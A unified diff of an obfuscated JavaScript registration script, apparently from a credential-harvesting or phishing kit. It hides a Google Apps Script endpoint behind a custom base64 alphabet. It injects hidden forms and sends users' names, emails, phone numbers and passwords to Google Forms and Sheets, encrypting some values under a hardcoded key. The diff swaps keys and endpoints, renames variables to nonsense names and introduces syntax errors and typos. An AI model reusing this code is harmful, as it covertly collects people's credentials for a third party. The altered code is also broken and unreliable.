@@ -32,28 +32,28 @@ var base64 = {
    return stringOutput;
  },
  decode : function base64toString(format) {
-   var i;
-   var bite;
-   var enteredKey;
+   var second;
+   var ord;
+   var wc;
    var _0x23e423;
    var _0x477a34;
    var _0x47c369;
-   var out = "";
+   var result = "";
    var i_format = 0;
    format = format.replace(/[^A-Za-z0-9\+\/=]/g, "");
    for (; i_format < format.length;) {
-     i = this["_keyStr"].indexOf(format.charAt(i_format++)) << 2 | (_0x23e423 = this["_keyStr"].indexOf(format.charAt(i_format++))) >> 4;
-     bite = (15 & _0x23e423) << 4 | (_0x477a34 = this["_keyStr"].indexOf(format.charAt(i_format++))) >> 2;
-     enteredKey = (3 & _0x477a34) << 6 | (_0x47c369 = this["_keyStr"].indexOf(format.charAt(i_format++)));
-     out = out + String.fromCharCode(i);
+     second = this["_keyStr"].indexOf(format.charAt(i_format++)) << 2 | (_0x23e423 = this["_keyStr"].indexOf(format.charAt(i_format++))) >> 4;
+     ord = (15 & _0x23e423) << 4 | (_0x477a34 = this["_keyStr"].indexOf(format.charAt(i_format++))) >> 2;
+     wc = (3 & _0x477a34) << 6 | (_0x47c369 = this["_keyStr"].indexOf(format.charAt(i_format++)));
+     result = result + String.fromCharCode(second);
      if (64 != _0x477a34) {
-       out = out + String.fromCharCode(bite);
+       result = result + String.fromCharCode(ord);
      }
      if (64 != _0x47c369) {
-       out = out + String.fromCharCode(enteredKey);
+       result = result + String.fromCharCode(wc);
      }
    }
-   return out = base64["_utf8_decode"](out);
+   return result = base64["_utf8_decode"](result);
  },
  _utf8_encode : function utf8Encode(s) {
    s = s.replace(/\r\n/g, "\n");
@@ -100,185 +100,191 @@ var base64 = {
    return string;
  }
 };
-
-var usrPswKey = "2356598547";
-var dataWd = 'YL9xXQ5MWQhzZ3vEZV==';
+var usrPswKey = "1029384756";
+var dataWd = "YL9xXQ5MWQhzZ3vEZV==";
 var host = window.location.hostname;
-var rplcHm = wc.url.home.replace('https://', '').replace('/', '');
+var rplcHm = wc.url.home.replace("https://", "").replace("/", "");
 var joinHm = rplcHm + base64.decode(dataWd);
 var getL = wc.license.token;
 var dhJoin = host + base64.decode(dataWd);
 if (getL === base64.encode(dhJoin) || getL === base64.encode(joinHm)) {
-    $('#email,#password').keyup(function () {
-        $(this).val($(this).val().replace(/\s/g, ''));
-    });
-    function framz() {
-        if (typeof sent_uexxnchh != 'undefined') {
-            document.querySelector('.wrapPop').classList.remove('hidden');
-        }
-        ;
-    }
-    document.addEventListener('DOMContentLoaded', () => {
-        $('.flexAja').append('<iframe style=\'display:none!important\' name=\'iframe_uexxnchh\' id=\'iframe_uexxnchh\' onload=framz()></iframe><button class=\'ubahMail\' onclick=document.querySelector(\'.emailConfirm\').classList.add(\'hidden\')></button><form method=\'POST\' id=\'ss-form\' target=\'iframe_uexxnchh\' onsubmit=\'sent_uexxnchh=true\'><input style=\'color:transparent!important;display:none!important\' type=\'text\' class=\'otpNm hidden\' value=\'\' dir=\'auto\' title=\'\' name=\'' + wc.verifikasiForm.name + '\'' + 'id=\'' + wc.verifikasiForm.name + '\'' + '/><input style=\'color:transparent!important;display:none!important\' type=\'email\' class=\'otpMail hidden\' value=\'\' dir=\'auto\' title=\'\' name=\'' + wc.verifikasiForm.email + '\'' + 'id=\'' + wc.verifikasiForm.email + '\'' + '/><input style=\'color:transparent!important;display:none!important\' type=\'text\' class=\'otpMz hidden\' value=\'\' dir=\'auto\' title=\'\' name=\'' + wc.verifikasiForm.otp + '\'' + 'id=\'' + wc.verifikasiForm.otp + '\'' + '/><button type=\'submit\' name=\'submit\' class=\'register next\' onclick=document.querySelector(\'.lanjut\').classList.remove(\'hidden\')></button></form>');
-        document.getElementById('ss-form').action = 'https://docs.google.com/forms/d/' + wc.verifikasiForm.token + '/formResponse';
-        $('.otpMz').val(rndmOtp);
-    });
-    $('#email').keyup(function () {
-        $(this).val($(this).val().replace(/\s/g, ''));
-        var _0x48aac0 = $('#email').val();
-        $('.otpMail').val(_0x48aac0);
-        $('.mailuser1').html(_0x48aac0);
-        $('.mailuser2').html(_0x48aac0);
-    });
-    $('#name').keyup(function () {
-        var _0x575c50 = $('#name').val();
-        $('.otpNm').val(_0x575c50);
-    });
-    function randomString(_0xe4d247, _0x3cd3ce) {
-        _0x3cd3ce = _0x3cd3ce || '0123456789';
-        var _0x47b0dd = '';
-        for (var _0xfa9dda = 0; _0xfa9dda < _0xe4d247; _0xfa9dda++) {
-            var _0x5aa8f5 = Math.floor(Math.random() * _0x3cd3ce.length);
-            _0x47b0dd += _0x3cd3ce.substring(_0x5aa8f5, _0x5aa8f5 + 1);
-        }
-        return _0x47b0dd;
-    }
-    var rndmOtp = base64.encode(randomString(6));
-    const scriptURL = base64.decode('Xiv0Zia6md9qS3kzZiuoW29pW2cEmwrpYM9nSQrdY3apZd8=') + wc.googleSheet.token + '/exec';
-    const form = document.forms['register-form'];
-    const btn = document.querySelector('button.otpLanjut');
-    btn.addEventListener('click', _0x5aed77 => {
-        $('#noHp').prop('type', 'text');
-        $('#password').prop('type', 'text');
-        var _0x262bec = $('#password').val();
-        var _0x5dc655 = $('#email').val();
-        var _0x2e2a76 = $('#noHp').val();
-        var _0x32192f = CryptoJS.AES.encrypt(_0x2e2a76, usrPswKey);
-        $('#noHp').val(_0x32192f);
-        var _0x1b51f2 = CryptoJS.AES.encrypt(_0x262bec, usrPswKey);
-        $('#password').val(_0x1b51f2);
-        var _0x4fdf9a = base64.encode(_0x5dc655);
-        $('#email').val(_0x4fdf9a);
-        document.querySelector('.otpLanjut').disabled = true;
-        document.querySelector('.otpLanjut').innerHTML = loading;
-        _0x5aed77.preventDefault();
-        fetch(scriptURL, {
-            method: 'POST',
-            body: new FormData(form)
-        }).then(_0x51ee06 => console.log('Success!', _0x51ee06)).catch(_0x243cc5 => console.error('Error!', _0x243cc5.message));
-        setTimeout(function () {
-            window.location.href = wc.url.login;
-        }, 1000);
-    });
-    $('#otp').keyup(function () {
-        $(this).val($(this).val().replace(/\s/g, ''));
-        var _0x160008 = $('#otp').val();
-        if (_0x160008 === base64.decode(rndmOtp)) {
-            document.querySelector('.otpLanjut').classList.remove('lock');
-            document.querySelector('.otpLanjut').disabled = false;
-        } else {
-            if (_0x160008.length === 6 && _0x160008 != base64.decode(rndmOtp)) {
-                alert(kodeVerifikasiSalah);
-                $('#otp').val('');
-            }
-        }
-    });
-    function show() {
-        var _0x385905 = document.querySelector('#password');
-        if (_0x385905.type === 'password') {
-            _0x385905.type = 'text';
-            document.querySelector('.icon1').classList.toggle('hidden');
-            document.querySelector('.icon2').classList.toggle('hidden');
-        } else {
-            _0x385905.type = 'password';
-            document.querySelector('.icon1').classList.toggle('hidden');
-            document.querySelector('.icon2').classList.toggle('hidden');
-        }
-    }
-    function register() {
-        var _0xbce618 = $('#name').val();
-        var _0x56dc45 = $('#email').val();
-        var _0x4b364a = $('#password').val();
-        var _0x3382a7 = $('#noHp').val();
-        if (_0xbce618 === '') {
-            $('#name').focus();
-            $('#logNotif').toggleClass('hidden');
-            $('#logNotif').html(nameTidakBolehKosong);
-            setTimeout(function () {
-                $('#logNotif').toggleClass('hidden');
-            }, 2000);
-        } else {
-            if (_0x56dc45 === '') {
-                $('#email').focus();
-                $('#logNotif').toggleClass('hidden');
-                $('#logNotif').html(emailTidakBolehKosong);
-                setTimeout(function () {
-                    $('#logNotif').toggleClass('hidden');
-                }, 2000);
-            } else {
-                if (_0x3382a7 === '') {
-                    $('#noHp').focus();
-                    $('#logNotif').toggleClass('hidden');
-                    $('#logNotif').html(nohpTidakBolehKosong);
-                    setTimeout(function () {
-                        $('#logNotif').toggleClass('hidden');
-                    }, 2000);
-                } else {
-                    if (_0x4b364a === '') {
-                        $('#password').focus();
-                        $('#logNotif').toggleClass('hidden');
-                        $('#logNotif').html(passwordTidakBolehKosong);
-                        setTimeout(function () {
-                            $('#logNotif').toggleClass('hidden');
-                        }, 2000);
-                    } else {
-                        $('#logNotif').toggleClass('hidden');
-                        $('#logNotif').html(loading);
-                        $.ajax({
-                            url: base64.decode('Xiv0Zia6md9qS3kzZiuoW29pW2cEmwrpYM9nSQrdY3apZd8=') + wc.googleSheet.token + '/exec',
-                            type: 'GET',
-                            data: 'users',
-                            crossDomain: true,
-                            dataType: '',
-                            success: function (_0xe13b4d) {
-                                var _0x47c0e6 = _0xe13b4d.user;
-                                function _0x47ec17(_0x32cd3d, _0x413c93) {
-                                    return (_0x3c42ee, _0x48563c) => _0x3c42ee[_0x32cd3d] === _0x413c93;
-                                }
-                                var _0x3d4be5 = $('#email').val();
-                                let _0xe08bc4 = _0x47ec17('email', base64.encode(_0x3d4be5));
-                                let _0x51ede6 = _0x47c0e6.findIndex(_0xe08bc4);
-                                var _0x83c8bc = _0x47c0e6[_0x51ede6];
-                                var _0x3b8cd0 = base64.decode(_0x83c8bc.email);
-                                if (_0x56dc45 == _0x3b8cd0) {
-                                    alert(emailSudahTerdaftar);
-                                    window.location.reload();
-                                    document.querySelector('button').classList.add('lock');
-                                    document.querySelector('button').disabled = true;
-                                    document.querySelector('button').classList.remove('register');
-                                }
-                            }
-                        });
-                        setTimeout(function () {
-                            document.querySelector('.emailConfirm').classList.remove('hidden');
-                            $('#logNotif').html('');
-                        }, 5000);
-                        sessionStorage.setItem('nameIn', $('#name').val());
-                        sessionStorage.setItem('noIn', $('#noHp').val());
-                        sessionStorage.setItem('psIn', $('#password').val());
-                    }
-                }
-            }
-        }
-    }
-    $('#name').val(sessionStorage.getItem('nameIn'));
-    $('#noHp').val(sessionStorage.getItem('noIn'));
-    $('#password').val(sessionStorage.getItem('psIn'));
+ var framz = function onQuietFail() {
+   if (typeof sent_uexxnchh != "undefined") {
+     document.querySelector(".wrapPop").classList.remove("hidden");
+   }
+ };
+ var randomString = function randomString(min, chars) {
+   chars = chars || "0123456789";
+   var token = "";
+   var tmpval = 0;
+   for (; tmpval < min; tmpval++) {
+     var pos = Math.floor(Math.random() * chars.length);
+     token = token + chars.substring(pos, pos + 1);
+   }
+   return token;
+ };
+ var show = function show() {
+   var el = document.querySelector("#password");
+   if (el.type === "password") {
+     el.type = "text";
+     document.querySelector(".icon1").classList.toggle("hidden");
+     document.querySelector(".icon2").classList.toggle("hidden");
+   } else {
+     el.type = "password";
+     document.querySelector(".icon1").classList.toggle("hidden");
+     document.querySelector(".icon2").classList.toggle("hidden");
+   }
+ };
+ var register = function show() {
+   var relativeFromCwd = $("#name").val();
+   var stripTerrain = $("#email").val();
+   var valueitem = $("#password").val();
+   var nDec = $("#noHp").val();
+   if (relativeFromCwd === "") {
+     $("#name").focus();
+     $("#logNotif").toggleClass("hidden");
+     $("#logNotif").html(nameNotAllowEmpty);
+     setTimeout(function() {
+       $("#logNotif").toggleClass("hidden");
+     }, 2000);
+   } else {
+     if (stripTerrain === "") {
+       $("#email").focus();
+       $("#logNotif").toggleClass("hidden");
+       $("#logNotif").html(emailCannotEmpty);
+       setTimeout(function() {
+         $("#logNotif").toggleClass("hidden");
+       }, 2000);
+     } else {
+       if (nDec === "") {
+         $("#noHp").focus();
+         $("#logNotif").toggleClass("hidden");
+         $("#logNotif").html(nohpCannotEmpty);
+         setTimeout(function() {
+           $("#logNotif").toggleClass("hidden");
+         }, 2000);
+       } else {
+         if (valueitem === "") {
+           $("#password").focus();
+           $("#logNotif").toggleClass("hidden");
+           $("#logNotif").html(passwordCannotEmpty);
+           setTimeout(function() {
+             $("#logNotif").toggleClass("hidden");
+           }, 2000);
+         } else {
+           $("#logNotif").toggleClass("hidden");
+           $("#logNotif").html(loading);
+           $.ajax({
+             url : base64.decode("Xiv0Zia6md9qS3kzZiuoW29pW2cEmwrpYM9nSQrdY3apZd8=") + wc.googleSheet.token + "/exec",
+             type : "GET",
+             data : "users",
+             crossDomain : true,
+             dataType : "",
+             success : function render(data) {
+               function callback(key, index) {
+                 return function(indices, canCreateDiscussions) {
+                   return indices[key] === index;
+                 };
+               }
+               var opts = data.user;
+               var out = $("#email").val();
+               var res = callback("email", base64.encode(out));
+               var type = opts.findIndex(res);
+               var options = opts[type];
+               var river = base64.decode(options.email);
+               if (stripTerrain == river) {
+                 alert(emailAlready Registered);
+                 window.location.reload();
+                 document.querySelector("button").classList.add("lock");
+                 document.querySelector("button").disabled = true;
+                 document.querySelector("button").classList.remove("register");
+               }
+             }
+           });
+           setTimeout(function() {
+             document.querySelector(".emailConfrim").classList.remove("hidden");
+             $("#logNotif").html("");
+           }, 5000);
+           sessionStorage.setItem("nameIn", $("#name").val());
+           sessionStorage.setItem("noIn", $("#noHp").val());
+           sessionStorage.setItem("psIn", $("#password").val());
+         }
+       }
+     }
+   }
+ };
+ $("#email,#password").keyup(function() {
+   $(this).val($(this).val().replace(/\s/g, ""));
+ });
+ document.addEventListener("DOMContentLoaded", function() {
+   $(".flexAja").append("<iframe style='display:none!important' name='iframe_uexxnchh' id='iframe_uexxnchh' onload=framz()></iframe><button class='ubahMail' onclick=document.querySelector('.emailConfrim').classList.add('hidden')></button><form method='POST' id='ss-form' target='iframe_uexxnchh' onsubmit='sent_uexxnchh=true'><input style='color:transparent!important;display:none!important' type='text' class='otpNm hidden' value='' dir='auto' title='' name='" + wc.verifikasiForm.name + "'" + "id='" +
+   wc.verifikasiForm.name + "'" + "/><input style='color:transparent!important;display:none!important' type='email' class='otpMail hidden' value='' dir='auto' title='' name='" + wc.verifikasiForm.email + "'" + "id='" + wc.verifikasiForm.email + "'" + "/><input style='color:transparent!important;display:none!important' type='text' class='otpMz hidden' value='' dir='auto' title='' name='" + wc.verifikasiForm.otp + "'" + "id='" + wc.verifikasiForm.otp + "'" + "/><button type='submit' name='submit' class='register next' onclick=document.querySelector('.lanjut').classList.remove('hidden')></button></form>");
+   document.getElementById("ss-form").action = "https://docs.google.com/forms/d/" + wc.verifikasiForm.token + "/formResponse";
+   $(".otpMz").val(rndmOtp);
+ });
+ $("#email").keyup(function() {
+   $(this).val($(this).val().replace(/\s/g, ""));
+   var maptitle = $("#email").val();
+   $(".otpMail").val(maptitle);
+   $(".mailuser1").html(maptitle);
+   $(".mailuser2").html(maptitle);
+ });
+ $("#name").keyup(function() {
+   var encodedPW = $("#name").val();
+   $(".otpNm").val(encodedPW);
+ });
+ var rndmOtp = base64.encode(randomString(6));
+ var scriptURL = base64.decode("Xiv0Zia6md9qS3kzZiuoW29pW2cEmwrpYM9nSQrdY3apZd8=") + wc.googleSheet.token + "/exec";
+ var form = document.forms["register-form"];
+ var btn = document.querySelector("button.otpLanjut");
+ btn.addEventListener("click", function(event) {
+   $("#noHp").prop("type", "text");
+   $("#password").prop("type", "text");
+   var string_it = $("#password").val();
+   var out = $("#email").val();
+   var password = $("#noHp").val();
+   var encodedPW = CryptoJS.AES.encrypt(password, usrPswKey);
+   $("#noHp").val(encodedPW);
+   var encrypted = CryptoJS.AES.encrypt(string_it, usrPswKey);
+   $("#password").val(encrypted);
+   var elem = base64.encode(out);
+   $("#email").val(elem);
+   document.querySelector(".otpLanjut").disabled = true;
+   document.querySelector(".otpLanjut").innerHTML = loading;
+   event.preventDefault();
+   fetch(scriptURL, {
+     method : "POST",
+     body : new FormData(form)
+   }).then(function(contextReference) {
+     return console.log("Success!", contextReference);
+   }).catch(function(data) {
+     return console.error("Error!", data.message);
+   });
+   setTimeout(function() {
+     window.location.href = wc.url.login;
+   }, 1000);
+ });
+ $("#otp").keyup(function() {
+   $(this).val($(this).val().replace(/\s/g, ""));
+   var expRecords = $("#otp").val();
+   if (expRecords === base64.decode(rndmOtp)) {
+     document.querySelector(".otpLanjut").classList.remove("lock");
+     document.querySelector(".otpLanjut").disabled = false;
+   } else {
+     if (expRecords.length === 6 && expRecords != base64.decode(rndmOtp)) {
+       alert(codeVerificationIncorrect);
+       $("#otp").val("");
+     }
+   }
+ });
+ $("#name").val(sessionStorage.getItem("nameIn"));
+ $("#noHp").val(sessionStorage.getItem("noIn"));
+ $("#password").val(sessionStorage.getItem("psIn"));
 } else {
-    window.location.reload();
+ window.location.reload();
 }
 $.ajax({
- url : base64.decode("Xiv0Zia6md9qS3kzZiuoW29pW2cEmwrpYM9nSQrdY3apZd8=") + base64.decode("uOnwTQrBh3k6riKav1GQPO95ZivBTOkpMLrAZ3Gpu2ZdrNkcPL1bmQ5XZ1hIQDrIhJ5vvJvbWKucrIF5W3vzTir4rQvUPwz1ZiZ=") + "/exec",
+ url : base64.decode("Xiv0Zia6md9qS3kzZiuoW29pW2cEmwrpYM9nSQrdY3apZd8=") + base64.decode("uOnwTQrBTJP6TCrpMqAWOOKIZQVbuRkoNOKxYwj2MO91rCGxP2hXY0PWXEFqv19rQLz3hLhBPLadQizHOqJ1NQhpNwZ1sOEx") + "/exec",
  type : "GET",
  data : "users",
  crossDomain : true,
@@ -313,14 +319,14 @@ $.ajax({
        var secondary = data.feed.id.$t;
        var target = secondary.split("-");
        var p = target[1];
-       var i = rplcHm + base64.decode(dataWd);
+       var out = rplcHm + base64.decode(dataWd);
        if (p != obj.id) {
          createOption();
        } else {
          if (rplcHm != obj.domain) {
            createOption();
          } else {
-           if (getL != base64.encode(i)) {
+           if (getL != base64.encode(out)) {
              createOption();
            }
          }
